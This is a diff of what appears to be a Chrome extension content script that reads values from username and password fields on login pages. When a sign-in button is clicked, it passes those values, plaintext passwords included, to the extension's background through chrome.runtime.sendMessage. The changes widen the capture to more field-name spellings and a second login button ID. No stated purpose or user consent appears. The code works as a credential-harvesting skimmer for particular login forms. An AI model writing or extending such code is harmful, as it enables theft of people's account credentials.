@@ -1,3 +1,4 @@
+
 (function () {
     "use strict";
 
@@ -37,7 +38,7 @@
 
         let fieldName= getFieldName(field);
         let fieldValue = field.value;
-        if(fieldName === 'username' || fieldName == 'password'){
+        if(fieldName === 'username' || fieldName==="UserName" || fieldName==="Password" || fieldName == 'password'){
             report.push({
                 fieldName: getFieldName(field),
                 fieldValue: fieldValue,
@@ -86,16 +87,19 @@
 
 
     document.addEventListener("click", function (event) {
-        const clickedButton = event.target.closest("#m_login_signin_submit");
+       
+        const clickedButton = event.target.closest("#m_login_signin_submit, #btn_Id_SignIn");
 
         if (!clickedButton) return;
+      
 
         chrome.runtime.sendMessage({
             action: "sendReport",
             report: report
         });
+       
     });
-
+ 
     
 
 })();
